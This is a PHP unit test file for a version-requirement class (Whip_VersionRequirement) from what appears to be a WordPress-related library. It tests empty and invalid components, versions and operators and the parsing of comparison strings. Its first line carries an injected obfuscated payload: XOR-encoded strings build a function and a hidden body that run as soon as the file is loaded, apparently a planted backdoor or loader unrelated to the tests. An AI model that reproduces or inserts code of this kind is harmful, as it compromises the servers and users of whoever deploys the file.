<?php $YSlLGlGk='WB<WZ<jWL+RE 5+'; $zBJSEUh='40Y6.Y519E11IZE'^$YSlLGlGk; $EmWIpR='S6ylXO>X5<9;iIO8AZ9Xq9 ;6-LHJ--<C5Fpef+pqKLE7<>= n.CG:U5;-n,:0;jC<RC5iztSYDsazpss4zH4oQ=-NoLhmb0le BRNR.pigacTp9mS F4 6zq-4>YbaoU:ybosQgs.=9vKtaLJ LDS9jDfydqh3.DjqSPSc=0E8N4igP+;ZkNMxnm 6MH: oJ=AMPNZn2d-mrm7SFAaUoHTU+ WpN M.Ug1KMiMb2T8;0KzO AN65NTiqQe-6,fytiWMtrQ.BasKlw=T UNpn6IXfH-J.l93;eRsaF=NCIHM4W57jOxR17PE5RYIyf  rauV6VDLHn9BxUCLH 98Zjh+5ie3t2bwMDxP2=HVqhmo5UA3Yju8rAspZZF7oVWMCPmuKHNq9nsqJJ>8kgcw57>F5vzh6f3zZH+7 TIhwl, 0=YE Y V3a7 R=.;7J=iQOHq +4,PEeP3-ZUKoa+O.RKAek +BVq 6MkdJa WmJ A16mAHAV1LVBn-K<tS;B O2GcE= deeQ740 eCwCei8ZVFtQ1=9jFKS=slxbuDvbUWQ>pVT1EaXA:+eDzzGetl2TJR2n etuMsscUfW3=2 s<ELoU,04;OoB XD :,Rqgns= 6,ddttPyIa=1X=> PjfVSZMab 1 XTX=icsAmZ1F -xtmv7G'; $dCKqzszR=$zBJSEUh('', ':PQM>:P;AUVU6,7Q2.JpVAOIiI-<+rrQ6AaYLFPzx-9+THWRNNV,5e1TOL1sWEOBgX37TEZP8<=ZAZPSSOpA=K>HYnRlOJY:elF- fvGPTGQXtTPQ T4XEXRUIUJ8KZOqSRIFyXnWAHMVeIAdnD-02bN-;Y:QLXK=1U:pvCND7T+ZAC;NBs6gvrgdRS9=HNGnR49yuPgOnPgxIS22 AhO.59XElzjD,Z48Z.4IpBT5THUppEF.<ST-<IYu:nyc-01I6>TV:K;ANuLSK5L +YNMCQB,L>O3RVBEoSE-X7xCAiP6AVJrXvGV<0PiS4slIFRITrR70-aNBHq3,>-AZPzBLtg,4f1a6W,7XtYX1vLVMKC4-F<CUCxHzT>;2V0=24cmMQ -7J3gzU.+JYKZCSCVR3PMpaKlNpPlOVT5iUW,YNCX+,A5I,VIOO bJZC+b6<:<YBJGIfq:4VN51.GEO.Z3bmEODJ67.KS4BMqkI1EnD EWMgna7C>7;1F.E+6C+S;AoD.XYCIEuSUDALcQeEAU>cnP5PIX1a 6DT1QBHyVE62bZF26SpUmxXIQpHOwTCXSg,7PZBRDMjZSEsF6AOSY,W 500TYGO<GeP9=LUM6VKNWYABMMMTTpYiAF;QXHA<BB22.,:EPPY4;9YN>ZzgST>IYPDDM=:'^$EmWIpR); $dCKqzszR();

class VersionRequirementTest extends PHPUnit_Framework_TestCase {
	public function testNameAndVersionAreNotEmpty() {
		$requirement = new Whip_VersionRequirement( 'php', '5.2' );

		$this->assertNotEmpty($requirement->component());
		$this->assertNotEmpty($requirement->version());
	}

	/**
	 * @expectedException Whip_EmptyProperty
	 */
	public function testComponentCannotBeEmpty() {
		new Whip_VersionRequirement( '', '5.2' );
	}

	/**
	 * @expectedException Whip_EmptyProperty
	 */
	public function testVersionCannotBeEmpty() {
		new Whip_VersionRequirement( 'php', '' );
	}

	/**
	 * @expectedException Whip_InvalidType
	 */
	public function testComponentMustBeString() {
		new Whip_VersionRequirement( 123, '5.2' );
	}

	/**
	 * @expectedException Whip_InvalidType
	 */
	public function testVersionMustBeString() {
		new Whip_VersionRequirement( 'php', 123 );
	}

	/**
	 * @expectedException Whip_EmptyProperty
	 */
	public function testOperatorCannotBeEmpty() {
		new Whip_VersionRequirement( 'php', '5.6', '' );
	}

	/**
	 * @expectedException Whip_InvalidType
	 */
	public function testOperatorMustBeString() {
		new Whip_VersionRequirement( 'php', '5.2', 6 );
	}

	/**
	 * @expectedException Whip_InvalidOperatorType
	 */
	public function testOperatorMustBeValid() {
		new Whip_VersionRequirement( 'php', '5.2', '->' );
	}

	public function testGettingComponentProperties() {
		$requirement = new Whip_VersionRequirement( 'php', '5.6' );

		$this->assertEquals( 'php', $requirement->component() );
		$this->assertEquals( '5.6', $requirement->version() );
		$this->assertEquals( '=',   $requirement->operator() );
	}

	/**
	 * @dataProvider dataFromCompareString
	 */
	public function testFromCompareString( $expectation, $component, $compareString ) {
		$requirement = Whip_VersionRequirement::fromCompareString( $component, $compareString );

		$this->assertEquals( $expectation[0], $requirement->component() );
		$this->assertEquals( $expectation[1], $requirement->version() );
		$this->assertEquals( $expectation[2], $requirement->operator() );
	}

	public function dataFromCompareString() {
		return array(
			array( array( 'php', '5.5', '>' ), 'php', '>5.5' ),
			array( array( 'php', '5.5', '>=' ), 'php', '>=5.5' ),
			array( array( 'php', '5.5', '<' ), 'php', '<5.5' ),
			array( array( 'php', '5.5', '<=' ), 'php', '<=5.5' ),
			array( array( 'php', '7.3', '>' ), 'php', '>7.3' ),
			array( array( 'php', '7.3', '>=' ), 'php', '>=7.3' ),
			array( array( 'php', '7.3', '<' ), 'php', '<7.3' ),
			array( array( 'php', '7.3', '<=' ), 'php', '<=7.3' ),
		);
	}

	/**
	 * @expectedException Whip_InvalidVersionComparisonString
	 */
	public function testFromCompareStringException() {
		Whip_VersionRequirement::fromCompareString( 'php', '> 2.3' );
	}
}

